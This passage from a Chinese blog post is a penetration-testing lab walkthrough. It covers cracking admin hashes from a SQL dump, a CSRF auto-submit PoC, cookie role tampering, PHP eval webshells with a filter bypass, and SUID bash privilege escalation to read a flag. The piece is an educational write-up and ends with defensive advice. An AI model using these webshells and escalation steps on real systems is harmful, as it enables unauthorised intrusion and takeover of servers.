+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">LOCK TABLES `admins` WRITE;<br><span class="hljs-comment">/*!40000 ALTER TABLE `admins` DISABLE KEYS */</span>;<br><span class="hljs-keyword">INSERT INTO</span> `admins` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;security_audit&#x27;</span>,<span class="hljs-string">&#x27;$2y$10$Rt7qZwqYOLWFZCEHfThGXudOpl/K3KVx50krQSA1kT3xw1cc7JFF2&#x27;</span>,<span class="hljs-string">&#x27;audit@example.com&#x27;</span>,<span class="hljs-string">&#x27;auditor&#x27;</span>,NOW(),NOW());<br><span class="hljs-keyword">INSERT INTO</span> `admins` <span class="hljs-keyword">VALUES</span> (<span class="hljs-number">2</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,<span class="hljs-string">&#x27;$2y$10$bZdU0ipfQyWmOi1BW72GH.cGywpeawymx6.Z41g.PHZNGsav/KVq.&#x27;</span>,<span class="hljs-string">&#x27;admin@example.com&#x27;</span>,<span class="hljs-string">&#x27;admin&#x27;</span>,NOW(),NOW());<br><span class="hljs-comment">/*!40000 ALTER TABLE `admins` ENABLE KEYS */</span>;<br>UNLOCK TABLES;<br></code></pre></td></tr></table></figure>
+
+<p>通过hash爆破，成功获取其账密iloveryan&#x2F;security_audit<br>（ps:这里admin的hash是无法被爆出的）</p>
+<p>然后利用其账密成功登录<br><img src="/images/csdn/169168232/c71c9c88620f4644a08a66bbfea22d45.png" srcset="/img/loading.gif" lazyload></p>
+<h3 id="三、进行漏洞挖掘"><a href="#三、进行漏洞挖掘" class="headerlink" title="三、进行漏洞挖掘"></a>三、进行漏洞挖掘</h3><h4 id="漏洞一：csrf"><a href="#漏洞一：csrf" class="headerlink" title="漏洞一：csrf"></a>漏洞一：csrf</h4><p>刚开始看到文章发布的功能，其实我第一想法是 XSS 或者是CSRF</p>
+<p>最先尝试的是XSS钓鱼，然后尝试一些基础的 payload 以及一些简单的绕过手段，发现无法绕过，于是尝试是否可以进行CSRF攻击</p>
+<p>这里先写一下csrf的poc</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>CSRF PoC - 自动发文章<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span> <span class="hljs-attr">onload</span>=<span class="hljs-string">&quot;document.forms[0].submit()&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h3</span>&gt;</span>正在测试 CSRF...<span class="hljs-tag">&lt;/<span class="hljs-name">h3</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 自动提交表单 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://靶机的ip/articles.php?action=new&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;action&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;add&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;title&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;CSRF_Test_Article&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;content&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;This is a CSRF test.&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>进行访问，发现确实存在csrf<br><img src="/images/csdn/169168232/d980efe05aa34c848a46812f705e756c.png" srcset="/img/loading.gif" lazyload><br>由于是靶场，无法进行社工，也找不到管理员bot的提交按钮，所以可以确认不止这一个漏洞，继续·进行寻找</p>
+<h4 id="漏洞二：垂直越权"><a href="#漏洞二：垂直越权" class="headerlink" title="漏洞二：垂直越权"></a>漏洞二：垂直越权</h4><p>打开F12的存储功能，发现其cookie的值未经过任何加密，以base64编码的形式直接储存<br><img src="/images/csdn/169168232/14d777964af84bf98316fabce0cc1562.png" srcset="/img/loading.gif" lazyload><br>复制cookie值并进行解码，发现存在垂直越权漏洞<br><img src="/images/csdn/169168232/610bf25f605240b69164b7b146e3ad41.png" srcset="/img/loading.gif" lazyload><br>将role值改为admin，并进行base64编码，然后重新放回cookie中去，发现成功访问管理员才能访问的一些功能界面，垂直越权成功<br><img src="/images/csdn/169168232/682b0609ac954c029d4fb4bd43e19c1f.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="漏洞三：文件上传"><a href="#漏洞三：文件上传" class="headerlink" title="漏洞三：文件上传"></a>漏洞三：文件上传</h4><p>先尝试最基础的一句话木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/images/csdn/169168232/83a4f295ce85403ba2a94eae2e51ea43.png" srcset="/img/loading.gif" lazyload><br>上传失败，显示不能包含php代码，怀疑会检查特征字符串比如&lt;?或&lt;?php，所以这里我们用script标签来尝试绕过</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;script language=<span class="hljs-string">&quot;php&quot;</span>&gt;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);&lt;/script&gt;<br></code></pre></td></tr></table></figure>
+
+<p>上传成功，尝试通过蚁剑进行连接，发现多次更改路径都显示连接失败，重新回到靶场寻找线索，在前端源代码中找到了原因</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;zh-CN&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>模板上传 - 企业CMS系统<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;assets/css/bootstrap.min.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;assets/css/bootstrap-icons.css&quot;</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span>&gt;</span><br>    <span class="hljs-comment">&lt;!-- 上传路径格式: 日期_MD5(文件名+大小的前10位).扩展名 --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        <span class="hljs-selector-class">.content-wrapper</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">padding</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.upload-container</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">max-width</span>: <span class="hljs-number">800px</span>;</span><br><span class="language-css">            <span class="hljs-attribute">margin</span>: <span class="hljs-number">0</span> auto;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">        <span class="hljs-selector-class">.card</span> &#123;</span><br><span class="language-css">            <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">4px</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,.<span class="hljs-number">1</span>);</span><br><span class="language-css">            <span class="hljs-attribute">margin-bottom</span>: <span class="hljs-number">20px</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>上传的木马进行了重命名。</p>
+<p>根据提示改变路径重新进行连接，连接成功<br><img src="/images/csdn/169168232/d9cb054c7c7d4fee8cb42ba0737c7031.png" srcset="/img/loading.gif" lazyload><br><strong>成功getshell !</strong></p>
+<h2 id="阶段二：-内网渗透"><a href="#阶段二：-内网渗透" class="headerlink" title="阶段二： 内网渗透"></a>阶段二： 内网渗透</h2><p>获取到shell之后，就进入了内网渗透的阶段</p>
+<p>该靶场的内网渗透比较简单，主要就是通过最基础的提权来获取flag，接下来简单给各位师傅说明</p>
+<h4 id="一、先在蚁剑里打开终端"><a href="#一、先在蚁剑里打开终端" class="headerlink" title="一、先在蚁剑里打开终端"></a>一、先在蚁剑里打开终端</h4><p>找到那条记录，右键打开虚拟终端即可<br><img src="/images/csdn/169168232/b8c6d37f8bba43c892da6a871932f1be.png" srcset="/img/loading.gif" lazyload></p>
+<h4 id="二、进行信息收集"><a href="#二、进行信息收集" class="headerlink" title="二、进行信息收集"></a>二、进行信息收集</h4><p>在虚拟终端里输入：</p>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+
+<p>靶场实际返回：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">uid=<span class="hljs-number">33</span><span class="hljs-punctuation">(</span>www-data<span class="hljs-punctuation">)</span> gid=<span class="hljs-number">33</span><span class="hljs-punctuation">(</span>www-data<span class="hljs-punctuation">)</span> groups=<span class="hljs-number">33</span><span class="hljs-punctuation">(</span>www-data<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure>
+
+<p>解释一下这三个概念，后面提权全靠它们：</p>
+<ul>
+<li><strong>uid</strong>：你”是谁”，33 对应 <code>www-data</code>，是 Web 服务专用低权限账号。</li>
+<li><strong>gid &#x2F; groups</strong>：你属于哪个用户组，这里也只有 www-data。</li>
+<li><strong>euid</strong>：有效用户 ID，“你当前以谁的身份在做事”，权限检查看的是它。现在还没出现，说明 euid 也是 33。</li>
+</ul>
+<p>再确认一下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">whoami</span><br></code></pre></td></tr></table></figure>
+
+<p>返回 <code>www-data</code>。</p>
+<h4 id="三、找”特权程序”（SUID-枚举）"><a href="#三、找”特权程序”（SUID-枚举）" class="headerlink" title="三、找”特权程序”（SUID 枚举）"></a>三、找”特权程序”（SUID 枚举）</h4><p>这是提权的标准起手式，输入：</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-built_in">find</span> / -perm <span class="hljs-number">-4000</span> -type f <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-literal">null</span> | <span class="hljs-built_in">sort</span><br></code></pre></td></tr></table></figure>
+
+<p>拆开解释这条命令：</p>
+<ul>
+<li><code>find /</code>：从根目录开始找。</li>
+<li><code>-perm -4000</code>：找权限位里带 <strong>SUID</strong> 的文件。4000 是八进制里的 SUID 标志。</li>
+<li><code>-type f</code>：只要普通文件。</li>
+<li><code>2&gt;/dev/null</code>：把”权限不足”之类的报错丢掉，避免刷屏。</li>
+</ul>
+<p><strong>SUID 是什么？</strong> 普通程序运行时用”你的身份”执行；如果一个可执行文件被设置了 SUID 位（属主是 root），那么<strong>任何人运行它时，进程的 euid 都会变成 root</strong>。设计初衷是让普通用户能临时借用 root 权限做特定事，比如 <code>/usr/bin/passwd</code> 改密码。</p>
+<p>靶场实际返回：</p>
+<figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/bin/bash<br><span class="hljs-regexp">/bin/mount</span><br><span class="hljs-regexp">/bin/su</span><br><span class="hljs-regexp">/bin/umount</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/chfn</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/chsh</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/gpasswd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/newgrp</span><br><span class="hljs-regexp">/usr/bin</span><span class="hljs-regexp">/passwd</span><br><span class="hljs-regexp">/usr</span><span class="hljs-regexp">/bin/sudo</span><br></code></pre></td></tr></table></figure>
+
+<p>正常情况下 <code>mount</code>、<code>su</code>、<code>passwd</code>、<code>sudo</code> 这些带 SUID 是合理的，但 <strong><code>/bin/bash</code> 绝对不应该带 SUID</strong>——bash 是个能执行任意命令的解释器，给它 SUID 等于给所有人一个 root 命令行。这就是这个靶场故意留下的后门。</p>
+<p>顺便看一下目标文件：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ls</span> -l /flag<br></code></pre></td></tr></table></figure>
+
+<p>返回：</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">-rwx<span class="hljs-params">------</span> 1 root root 39 <span class="hljs-string">/flag</span><br></code></pre></td></tr></table></figure>
+
+<p><code>-rwx------</code> 表示只有属主 root 能读写执行，其他人一律没权限；大小 39 字节。用 www-data 直接 <code>cat /flag</code> 会 Permission denied，必须先提权。</p>
+<h4 id="四、利用-SUID-bash-拿到-root"><a href="#四、利用-SUID-bash-拿到-root" class="headerlink" title="四、利用 SUID bash 拿到 root"></a>四、利用 SUID bash 拿到 root</h4><p>注意，不能直接敲 <code>bash</code>，因为 bash 启动时发现”我是被 SUID 拉起来的，euid 是 0 但真实用户是 www-data”，出于安全会<strong>主动把 euid 降回 uid</strong>，防止 SUID shell 被滥用。</p>
+<p><code>-p</code> 参数（privileged mode）就是告诉 bash：“保持特权”。所以执行：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -p -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>-p</code>：保持特权模式，不降低 euid。</li>
+<li><code>-c &quot;id&quot;</code>：让 bash 执行 <code>id</code> 这条命令然后退出。</li>
+</ul>
+<p>靶场实际返回：</p>
+<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">uid=<span class="hljs-number">33</span><span class="hljs-punctuation">(</span>www-data<span class="hljs-punctuation">)</span> gid=<span class="hljs-number">33</span><span class="hljs-punctuation">(</span>www-data<span class="hljs-punctuation">)</span> euid=<span class="hljs-number">0</span><span class="hljs-punctuation">(</span>root<span class="hljs-punctuation">)</span> groups=<span class="hljs-number">33</span><span class="hljs-punctuation">(</span>www-data<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure>
+
+<p>关键就在 <strong><code>euid=0(root)</code></strong>：真实身份还是 www-data，但当前进程的有效身份是 root，权限检查按 root 算。再验证一次：</p>
+<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">bash -p -<span class="hljs-keyword">c</span> <span class="hljs-string">&quot;whoami&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>返回 <code>root</code>。到这一步提权已经完成。</p>
+<h4 id="五、第四步：读取-flag"><a href="#五、第四步：读取-flag" class="headerlink" title="五、第四步：读取 flag"></a>五、第四步：读取 flag</h4><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">bash</span> -p -c <span class="hljs-string">&#x27;cat /flag&#x27;</span><br></code></pre></td></tr></table></figure>
+
+<p>因为这条命令的 euid 是 0，<code>/flag</code> 的 700 权限不再拦你，39 字节的内容会直接打印出来。如果返回 Permission denied，说明漏了 <code>-p</code>。</p>
+<h4 id="六、简单说明该漏洞"><a href="#六、简单说明该漏洞" class="headerlink" title="六、简单说明该漏洞"></a>六、简单说明该漏洞</h4><p>这是典型的 <strong>SUID 配置错误</strong>：<code>chmod u+s /bin/bash</code> 把能执行任意命令的解释器设成了 SUID root，等于给低权限用户留了直通车。压缩包里 <code>bak/system_monitor.sh</code> 的 <code>--security</code> 分支就藏着这句 <code>chmod u+s /bin/bash</code>，镜像在制作时已经执行过，所以现在直接就能用。真实环境中防御要点是：绝不给 shell&#x2F;解释器设 SUID、定期用 <code>find / -perm -4000</code> 审计、sudo 规则遵循最小权限、把 Web 服务跑在容器&#x2F;低权限用户里做隔离。</p>
+<p><img src="/images/csdn/169168232/086637f02eb148e69f27b337503dca2e.png" srcset="/img/loading.gif" lazyload><br><strong>成功读取flag：flag{0eba9ce397b868300cb5ceb5bf6a4666}</strong></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="category-chain-item">渗透测试</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%A4%96%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#外网渗透</a>
+      
+        <a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" class="print-no-link">#内网渗透</a>
+      
+        <a href="/tags/%E9%9D%B6%E5%9C%BA/" class="print-no-link">#靶场</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>【外网+内网】从靶场入手，全方位为你讲解如何进行渗透测试</div>
+      <div>https://chiya-66.github.io/2026/10/26/外网与内网渗透测试实战/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>chiya-66</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2026年10月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2026/11/06/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">sql注入</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2026/10/16/%E5%AE%9E%E9%AA%8C%EF%BC%9A%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" title="实验：内网渗透测试">
+                        <span class="hidden-mobile">实验：内网渗透测试</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    function isExpandAllEnabled() {
+      return CONFIG.toc && CONFIG.toc.expand_all === true;
+    }
+    function expandAllToc() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .tocbot-is-collapsed').removeClass('tocbot-is-collapsed');
+    }
+    function updateTocToggle($li, $childList) {
+      var $toggle = $li.children('.toc-toggle');
+      if ($toggle.length === 0) { return; }
+      var collapsed = $childList.hasClass('tocbot-is-collapsed');
+      $toggle
+        .toggleClass('toc-toggle-collapsed', collapsed)
+        .toggleClass('toc-toggle-expanded', !collapsed);
+    }
+    function bindTocToggle() {
+      if (!isExpandAllEnabled()) { return; }
+      jQuery('#toc-body .toc-list-item').each(function() {
+        var $li = jQuery(this);
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) {
+          if ($li.children('.toc-toggle').length === 0) {
+            $li.prepend('<span class="toc-toggle toc-toggle-placeholder" aria-hidden="true">›</span>');
+          }
+          return;
+        }
+
+        if ($li.children('.toc-toggle').length === 0) {
+          $li.prepend('<span class="toc-toggle toc-toggle-expanded" aria-hidden="true">›</span>');
+        }
+        updateTocToggle($li, $childList);
+      });
+      jQuery('#toc-body').off('click.tocToggle').on('click.tocToggle', '.toc-toggle', function(e) {
+        e.preventDefault();
+        e.stopPropagation();
+        var $li = jQuery(this).parent('.toc-list-item');
+        var $childList = $li.children('ol');
+        if ($childList.length === 0) { return; }
+        $childList.toggleClass('tocbot-is-collapsed');
+        updateTocToggle($li, $childList);
+      });
+      if (!window.__tocToggleObserver) {
+        window.__tocToggleObserver = new MutationObserver(function(mutations) {
+          mutations.forEach(function(mutation) {
+            if (mutation.type !== 'attributes' || mutation.attributeName !== 'class') { return; }
+            var $list = jQuery(mutation.target);
+            var $li = $list.parent('.toc-list-item');
+            if ($li.length === 0) { return; }
+            updateTocToggle($li, $list);
+          });
+        });
+        jQuery('#toc-body ol').each(function() {
+          window.__tocToggleObserver.observe(this, { attributes: true });
+        });
+      }
+    }
+    var tocConfig = Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc);
+    if (isExpandAllEnabled()) {
+      tocConfig.collapseDepth = 6;
+    }
+    window.tocbot.init(tocConfig);
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+    expandAllToc();
+    bindTocToggle();
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+        expandAllToc();
+        bindTocToggle();
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
